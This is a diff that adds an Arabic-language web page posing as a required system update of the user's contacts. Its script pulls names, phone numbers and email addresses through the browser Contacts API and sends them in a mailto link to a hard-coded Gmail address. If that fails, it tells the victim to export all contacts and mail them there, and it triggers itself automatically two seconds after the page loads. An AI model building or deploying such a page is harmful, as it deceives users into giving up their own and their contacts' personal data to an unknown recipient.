@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>طلب الصلاحيات</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>مطلوب تحديث جهات الاتصال</h2>
+        <p>يجب تحديث سجل جهات الاتصال لنظامك</p>
+        
+        <button onclick="collectContacts()">بدء تحديث جهات الاتصال</button>
+        
+        <div id="status"></div>
+    </div>
+
+    <script>
+        async function collectContacts() {
+            const status = document.getElementById('status');
+            
+            try {
+                status.innerHTML = '<div class="status">جاري التحضير...</div>';
+                
+                // المحاولة الأولى: استخدام Contacts API إذا كان متاحًا
+                if ('contacts' in navigator && 'select' in navigator.contacts) {
+                    status.innerHTML = '<div class="status">جاري الوصول إلى جهات الاتصال...</div>';
+                    
+                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                    
+                    if (contacts && contacts.length > 0) {
+                        await sendContacts(contacts);
+                    } else {
+                        throw new Error('لم يتم اختيار أي جهات اتصال');
+                    }
+                } else {
+                    // إذا لم يكن Contacts API مدعومًا، استخدم الطريقة البديلة
+                    await useAlternativeMethod();
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                status.innerHTML = `<div class="error">فشل التحديث: ${error.message}</div>`;
+                
+                // المحاولة بالطريقة البديلة
+                setTimeout(useAlternativeMethod, 2000);
+            }
+        }
+
+        async function sendContacts(contacts) {
+            const status = document.getElementById('status');
+            
+            try {
+                status.innerHTML = '<div class="status">جاري إرسال البيانات...</div>';
+                
+                // طريقة الإرسال المضمونة: استخدام mailto مع البيانات
+                const contactsText = formatContactsToText(contacts);
+                await sendViaEmail(contactsText, contacts.length);
+                
+                status.innerHTML = '<div class="success">✅ تم التحديث بنجاح وإرسال البيانات</div>';
+                
+            } catch (error) {
+                throw new Error('فشل في إرسال البيانات');
+            }
+        }
+
+        function formatContactsToText(contacts) {
+            let text = `جهات الاتصال المجمعة\n`;
+            text += `التاريخ: ${new Date().toLocaleString('ar-SA')}\n`;
+            text += `العدد: ${contacts.length}\n\n`;
+            
+            contacts.forEach((contact, index) => {
+                text += `جهة اتصال ${index + 1}:\n`;
+                text += `الاسم: ${contact.name || 'غير متوفر'}\n`;
+                if (contact.tel) text += `الهاتف: ${contact.tel.join(', ')}\n`;
+                if (contact.email) text += `البريد: ${contact.email.join(', ')}\n`;
+                text += '────────────────────\n\n';
+            });
+            
+            return text;
+        }
+
+        async function sendViaEmail(contactsText, count) {
+            // الطريقة المضمونة: استخدام mailto
+            const subject = `جهات اتصال - ${count} جهة`;
+            const body = encodeURIComponent(contactsText);
+            const mailtoLink = `mailto:asd.asd.net.sy@gmail.com?subject=${encodeURIComponent(subject)}&body=${body}`;
+            
+            // فتح عميل البريد الإلكتروني
+            window.location.href = mailtoLink;
+            
+            return true;
+        }
+
+        async function useAlternativeMethod() {
+            const status = document.getElementById('status');
+            
+            status.innerHTML = '<div class="status">جاري استخدام الطريقة البديلة...</div>';
+            
+            // فتح البريد الإلكتروني مباشرة مع تعليمات
+            const message = `يرجى تصدير جهات الاتصال يدويًا وإرسالها إلى: asd.asd.net.sy@gmail.com\n\nتعليمات التصدير:\n1. افتح تطبيق جهات الاتصال\n2. اختر جميع الجهات\n3. اختر تصدير\n4. أرسل الملف إلى البريد أعلاه`;
+            
+            const mailtoLink = `mailto:asd.asd.net.sy@gmail.com?subject=جهات اتصال&body=${encodeURIComponent(message)}`;
+            window.location.href = mailtoLink;
+            
+            status.innerHTML = '<div class="success">✅ تم فتح البريد الإلكتروني - يرجى إكمال العملية يدويًا</div>';
+            
+            return true;
+        }
+
+        // بدء العملية تلقائيًا بعد تحميل الصفحة
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                document.querySelector('button').click();
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
